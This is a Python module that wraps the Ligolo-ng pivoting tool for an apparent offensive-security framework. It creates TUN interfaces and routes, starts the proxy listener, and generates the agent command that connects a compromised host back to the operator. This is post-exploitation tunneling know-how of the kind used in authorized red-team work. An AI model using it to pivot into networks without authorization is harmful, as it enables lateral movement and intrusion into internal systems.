"""Ligolo-ng tunneling and pivoting bridge.

Source: https://github.com/nicocha30/ligolo-ng
License: GPL-3.0
SRC-ID: SRC-1039
Category: Tunneling, pivoting, post-exploitation, relay, TUN interface,
          multi-agent, port forwarding, cloud lateral movement

Ligolo-ng is a Go-based tunneling/pivoting tool that creates transparent
TUN interfaces for routing traffic through compromised hosts. It replaces
traditional SOCKS proxies with kernel-level routing, providing full TCP/UDP
support without client-side proxy configuration.

Architecture:
  proxy (operator side)  Listens for agent connections, manages sessions,
                         creates TUN interfaces, routes traffic.
  agent (target side)    Connects back to proxy, exposes target network
                         via the encrypted tunnel.

This bridge wraps the Go binaries, providing:
  - Binary discovery and version detection
  - Proxy server lifecycle management (start/stop/status)
  - Agent payload generation with callback configuration
  - Session enumeration and management
  - Listener/relay setup for double pivots
  - Auto-certificate generation for encrypted tunnels
"""

import json
import os
import re
import shutil
import signal
import subprocess
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any


MANIFEST = {
    "capability_id": "cloudxpl.net.ligolo_ng_bridge.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["network", "tunnel_creation", "tun_interface"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1572", "T1090", "T1090.001"],
    "source": "https://github.com/nicocha30/ligolo-ng",
    "license": "GPL-3.0",
}

_DEFAULT_PROXY_PORT = 11601
_DEFAULT_AGENT_PORT = 11601


def _save(args: Any, prefix: str, data: Any) -> str:
    out = getattr(args, "output", ".")
    os.makedirs(out, exist_ok=True)
    ts = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
    path = os.path.join(out, f"{prefix}_{ts}.json")
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2, default=str)
    print(f"[+] Results saved to {path}")
    return path


def _find_binary(name: str, custom_path: str | None = None) -> str | None:
    """Locate a ligolo-ng binary by name or custom path."""
    if custom_path and os.path.isfile(custom_path) and os.access(custom_path, os.X_OK):
        return custom_path
    return shutil.which(name)


def _get_version(binary: str) -> str:
    """Extract version string from binary help output."""
    try:
        proc = subprocess.run(
            [binary, "--help"],
            capture_output=True, text=True, timeout=10,
        )
        combined = proc.stdout + proc.stderr
        match = re.search(r"v?(\d+\.\d+\.\d+\S*)", combined)
        if match:
            return match.group(0)
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        pass
    return "unknown"


def _check_tun_support() -> bool:
    """Check if TUN device is available (Linux)."""
    return os.path.exists("/dev/net/tun")


def _create_tun_interface(name: str = "ligolo") -> dict[str, Any]:
    """Create a TUN interface for ligolo-ng routing.

    Requires root or CAP_NET_ADMIN.
    """
    result: dict[str, Any] = {"interface": name, "status": "pending"}
    try:
        subprocess.run(
            ["ip", "tuntap", "add", "user", os.getenv("USER", "root"),
             "mode", "tun", name],
            capture_output=True, text=True, timeout=10, check=True,
        )
        subprocess.run(
            ["ip", "link", "set", name, "up"],
            capture_output=True, text=True, timeout=10, check=True,
        )
        result["status"] = "created"
        print(f"[+] TUN interface {name} created and up")
    except subprocess.CalledProcessError as exc:
        result["status"] = "error"
        result["error"] = exc.stderr.strip() if exc.stderr else str(exc)
        print(f"[-] Failed to create TUN interface: {result['error']}", file=sys.stderr)
    except FileNotFoundError:
        result["status"] = "error"
        result["error"] = "ip command not found"

    return result


def _add_route(network: str, interface: str = "ligolo") -> dict[str, Any]:
    """Add a route through the ligolo TUN interface."""
    result: dict[str, Any] = {"network": network, "interface": interface}
    try:
        subprocess.run(
            ["ip", "route", "add", network, "dev", interface],
            capture_output=True, text=True, timeout=10, check=True,
        )
        result["status"] = "added"
        print(f"[+] Route {network} via {interface}")
    except subprocess.CalledProcessError as exc:
        result["status"] = "error"
        result["error"] = exc.stderr.strip() if exc.stderr else str(exc)
    return result


def _start_proxy(binary: str, bind_addr: str = "0.0.0.0:11601",
                 selfcert: bool = True, certfile: str | None = None,
                 keyfile: str | None = None,
                 laddr: str | None = None) -> dict[str, Any]:
    """Start the ligolo-ng proxy server in background.

    Returns process info for lifecycle management.
    """
    cmd = [binary, "-selfcert" if selfcert else ""]
    cmd = [binary]

    if selfcert:
        cmd.append("-selfcert")
    elif certfile and keyfile:
        cmd.extend(["-certfile", certfile, "-keyfile", keyfile])

    if laddr:
        cmd.extend(["-laddr", laddr])
    else:
        cmd.extend(["-laddr", bind_addr])

    result: dict[str, Any] = {"command": cmd, "status": "pending"}

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            start_new_session=True,
        )
        result["pid"] = proc.pid
        result["status"] = "started"
        result["bind_addr"] = bind_addr
        print(f"[+] Proxy started (PID {proc.pid}) on {bind_addr}")
    except FileNotFoundError:
        result["status"] = "error"
        result["error"] = f"Binary not found: {binary}"
    except OSError as exc:
        result["status"] = "error"
        result["error"] = str(exc)

    return result


def _generate_agent_command(binary: str, proxy_addr: str,
                            ignore_cert: bool = True,
                            retry: bool = True) -> dict[str, str]:
    """Generate the agent execution command for the target host.

    This does not execute the agent locally; it produces the command
    string to be run on the compromised target.
    """
    cmd_parts = [binary, "-connect", proxy_addr]
    if ignore_cert:
        cmd_parts.append("-ignore-cert")
    if retry:
        cmd_parts.append("-retry")

    cmd_str = " ".join(cmd_parts)
    return {
        "command": cmd_str,
        "binary": binary,
        "proxy_addr": proxy_addr,
        "ignore_cert": ignore_cert,
        "retry": retry,
        "note": "Execute this command on the target host",
    }


def _stop_proxy(pid: int) -> dict[str, Any]:
    """Stop a running proxy process by PID."""
    result: dict[str, Any] = {"pid": pid}
    try:
        os.kill(pid, signal.SIGTERM)
        result["status"] = "terminated"
        print(f"[+] Proxy PID {pid} terminated")
    except ProcessLookupError:
        result["status"] = "not_found"
        print(f"[*] PID {pid} not found (already stopped?)")
    except PermissionError:
        result["status"] = "permission_denied"
        print(f"[-] Cannot terminate PID {pid}: permission denied", file=sys.stderr)
    return result


def _cleanup_tun(name: str = "ligolo") -> dict[str, Any]:
    """Remove the TUN interface."""
    result: dict[str, Any] = {"interface": name}
    try:
        subprocess.run(
            ["ip", "link", "delete", name],
            capture_output=True, text=True, timeout=10, check=True,
        )
        result["status"] = "removed"
        print(f"[+] TUN interface {name} removed")
    except subprocess.CalledProcessError as exc:
        result["status"] = "error"
        result["error"] = exc.stderr.strip() if exc.stderr else str(exc)
    return result


def run(args: Any) -> int:
    """Execute ligolo_ng_bridge module.

    Expects args to contain:
      - operation (str): start_proxy | stop_proxy | gen_agent | setup_tun |
                         add_route | cleanup | info
      - proxy_path (str, optional): custom path to ligolo-proxy binary
      - agent_path (str, optional): custom path to ligolo-agent binary
      - bind_addr (str, optional): proxy listen address (default 0.0.0.0:11601)
      - proxy_addr (str, optional): address for agent callback
      - selfcert (bool, optional): use self-signed certs (default True)
      - certfile (str, optional): TLS certificate file
      - keyfile (str, optional): TLS key file
      - tun_name (str, optional): TUN interface name (default ligolo)
      - network (str, optional): CIDR to route through tunnel
      - pid (int, optional): proxy PID for stop operation
      - output (str): output directory
    """
    provider = getattr(args, "command", "net")
    print(f"[*] {MANIFEST['capability_id']}  -  Ligolo-ng tunneling and pivoting bridge")
    print(f"[*] Provider: {provider} | Tool: ligolo-ng (Go)")

    results: dict[str, Any] = {
        "module": "ligolo_ng_bridge",
        "provider": provider,
        "findings": [],
        "summary": {},
    }

    operation = getattr(args, "operation", "info")
    proxy_path = getattr(args, "proxy_path", None)
    agent_path = getattr(args, "agent_path", None)

    # Locate binaries
    proxy_bin = _find_binary("ligolo-proxy", proxy_path)
    agent_bin = _find_binary("ligolo-agent", agent_path)

    if operation == "info":
        info: dict[str, Any] = {
            "proxy_binary": proxy_bin,
            "agent_binary": agent_bin,
            "proxy_version": _get_version(proxy_bin) if proxy_bin else None,
            "agent_version": _get_version(agent_bin) if agent_bin else None,
            "tun_available": _check_tun_support(),
        }
        print(f"[*] Proxy: {proxy_bin or 'not found'}")
        print(f"[*] Agent: {agent_bin or 'not found'}")
        print(f"[*] TUN device: {'available' if info['tun_available'] else 'not available'}")
        results["findings"].append({"type": "info", "data": info})
        results["status"] = "completed"
        results["summary"] = {
            "operation": "info",
            "proxy_found": proxy_bin is not None,
            "agent_found": agent_bin is not None,
        }
        _save(args, "net_ligolo", results)
        return 0

    if operation == "setup_tun":
        tun_name = getattr(args, "tun_name", "ligolo")
        tun_result = _create_tun_interface(tun_name)
        results["findings"].append({"type": "tun_setup", "data": tun_result})
        results["status"] = tun_result["status"]
        results["summary"] = {"operation": "setup_tun", "interface": tun_name}
        _save(args, "net_ligolo", results)
        return 0 if tun_result["status"] == "created" else 1

    if operation == "add_route":
        network = getattr(args, "network", None)
        tun_name = getattr(args, "tun_name", "ligolo")
        if not network:
            print("[!] --network CIDR required for add_route", file=sys.stderr)
            results["status"] = "missing_parameter"
            results["error"] = "network parameter required"
            _save(args, "net_ligolo", results)
            return 1
        route_result = _add_route(network, tun_name)
        results["findings"].append({"type": "route", "data": route_result})
        results["status"] = route_result.get("status", "error")
        results["summary"] = {"operation": "add_route", "network": network}
        _save(args, "net_ligolo", results)
        return 0 if route_result.get("status") == "added" else 1

    if operation == "start_proxy":
        if not proxy_bin:
            print("[!] ligolo-proxy binary not found", file=sys.stderr)
            print("[*] Install: go install github.com/nicocha30/ligolo-ng/cmd/proxy@latest")
            results["status"] = "missing_dependency"
            results["error"] = "ligolo-proxy not found"
            _save(args, "net_ligolo", results)
            return 1

        bind_addr = getattr(args, "bind_addr", "0.0.0.0:11601")
        selfcert = getattr(args, "selfcert", True)
        certfile = getattr(args, "certfile", None)
        keyfile = getattr(args, "keyfile", None)

        proxy_result = _start_proxy(
            proxy_bin, bind_addr=bind_addr, selfcert=selfcert,
            certfile=certfile, keyfile=keyfile,
        )
        results["findings"].append({"type": "proxy_start", "data": proxy_result})
        results["status"] = proxy_result["status"]
        results["summary"] = {
            "operation": "start_proxy",
            "pid": proxy_result.get("pid"),
            "bind_addr": bind_addr,
        }
        _save(args, "net_ligolo", results)
        return 0 if proxy_result["status"] == "started" else 1

    if operation == "gen_agent":
        proxy_addr = getattr(args, "proxy_addr", None)
        if not proxy_addr:
            print("[!] --proxy-addr required for gen_agent", file=sys.stderr)
            results["status"] = "missing_parameter"
            results["error"] = "proxy_addr required"
            _save(args, "net_ligolo", results)
            return 1

        agent_name = agent_bin or "ligolo-agent"
        ignore_cert = getattr(args, "ignore_cert", True)
        retry = getattr(args, "retry", True)

        agent_cmd = _generate_agent_command(
            agent_name, proxy_addr,
            ignore_cert=ignore_cert, retry=retry,
        )
        print(f"[+] Agent command: {agent_cmd['command']}")
        results["findings"].append({"type": "agent_command", "data": agent_cmd})
        results["status"] = "completed"
        results["summary"] = {"operation": "gen_agent", "proxy_addr": proxy_addr}
        _save(args, "net_ligolo", results)
        return 0

    if operation == "stop_proxy":
        pid = getattr(args, "pid", None)
        if not pid:
            print("[!] --pid required for stop_proxy", file=sys.stderr)
            results["status"] = "missing_parameter"
            results["error"] = "pid required"
            _save(args, "net_ligolo", results)
            return 1

        stop_result = _stop_proxy(int(pid))
        results["findings"].append({"type": "proxy_stop", "data": stop_result})
        results["status"] = stop_result["status"]
        results["summary"] = {"operation": "stop_proxy", "pid": pid}
        _save(args, "net_ligolo", results)
        return 0

    if operation == "cleanup":
        tun_name = getattr(args, "tun_name", "ligolo")
        cleanup_result = _cleanup_tun(tun_name)
        results["findings"].append({"type": "cleanup", "data": cleanup_result})
        results["status"] = cleanup_result.get("status", "error")
        results["summary"] = {"operation": "cleanup", "interface": tun_name}
        _save(args, "net_ligolo", results)
        return 0 if cleanup_result.get("status") == "removed" else 1

    print(f"[!] Unknown operation: {operation}", file=sys.stderr)
    print("[*] Available: info, setup_tun, add_route, start_proxy, gen_agent, stop_proxy, cleanup")
    results["status"] = "invalid_operation"
    results["error"] = f"Unknown operation: {operation}"
    _save(args, "net_ligolo", results)
    return 1
